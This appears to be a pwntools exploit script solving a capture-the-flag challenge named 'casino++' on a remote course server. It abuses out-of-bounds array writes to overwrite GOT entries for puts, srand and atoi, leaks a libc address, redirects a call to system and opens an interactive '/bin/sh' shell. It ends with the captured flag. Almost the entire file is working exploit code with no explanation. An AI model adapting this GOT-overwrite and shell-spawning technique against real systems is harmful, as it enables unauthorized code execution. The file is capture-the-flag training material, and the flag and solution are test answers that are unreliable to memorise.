from pwn import *
context.update(arch='amd64', os='linux')

def sendline(p, msg):
	p.sendline(msg)
	print "send ==> ", msg

l = ELF('./libc.so')
#l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = remote('edu-ctf.csie.org', 10176)
#p = process('./casino++')




print p.recv()
sendline(p, '\x00' * 0x20) #name
print p.recv()
sendline(p, '6299632') # age


'''
modify puts@got --> casino
force loop
'''
print p.recv()
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '1')
print p.recv()
sendline(p, '-43')
print p.recv()
sendline(p, '4196701')
print p.recv()

print p.recv()
sendline(p, '83')
print p.recv()
sendline(p, '86')
print p.recv()
sendline(p, '77')
print p.recv()
sendline(p, '15')
print p.recv()
sendline(p, '93')
print p.recv()
sendline(p, '35')
print p.recv()
sendline(p, '1')
print p.recv()
sendline(p, '-42')
print p.recv()
sendline(p, '0')


'''
modify srand@got --> printf@plt
'''
print p.recv()
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '1')
print p.recv()
sendline(p, '-35')
print p.recv()
sendline(p, '4196096') # 0x400700 printf@plt


print p.recv()
sendline(p, '83')
print p.recv()
sendline(p, '86')
print p.recv()
sendline(p, '77')
print p.recv()
sendline(p, '15')
print p.recv()
sendline(p, '93')
print p.recv()
sendline(p, '35')
print p.recv()
sendline(p, '1')
print p.recv()
sendline(p, '-34')
print p.recv()
sendline(p, '0')


'''
modify seed --> 0x601ff0 libc_start_main
'''
print p.recv()
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '1')
print p.recv()
sendline(p, '13')
print p.recv()
sendline(p, '6299632') # 0x601ff0

# gdb.attach(p)
# pause()

print p.recv()
sendline(p, '86')
print p.recv()
sendline(p, '92')
print p.recv()
sendline(p, '49')
print p.recv()
sendline(p, '21')
print p.recv()
sendline(p, '62')
print p.recv()
sendline(p, '27')
print p.recv()
sendline(p, '0')
print p.recv()

print '######################'

libc = u64(p.recv(6) + '\0\0') - 0x21ab0
l.address = libc
system_off = 0x4f440
system_func_ptr = l.sym.system # libc + system_off
bin_sh = l.search('/bin/sh').next() # libc + 0x1b3e9a

print 'libc base ==> ', hex(libc)
print 'bin_sh ==> ', hex(bin_sh)
print 'system_func_ptr ==> ', hex(system_func_ptr)

print '######################'



'''
modify atoi@got --> syscall
'''
print p.recv()
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '0')
print p.recv()
sendline(p, '1')
print p.recv()
sendline(p, '-29')
print p.recv()

tmp = '0x00' + hex(system_func_ptr)[2:]
lower = int(tmp[8:], 16)
upper = int(tmp[:8], 16)
sendline(p, str(lower))


print p.recv()
sendline(p, '/bin/sh\0')
p.interactive()



# FLAG{Y0u_pwned_me_ag4in!_Pwn1ng_n3v3r_di4_!}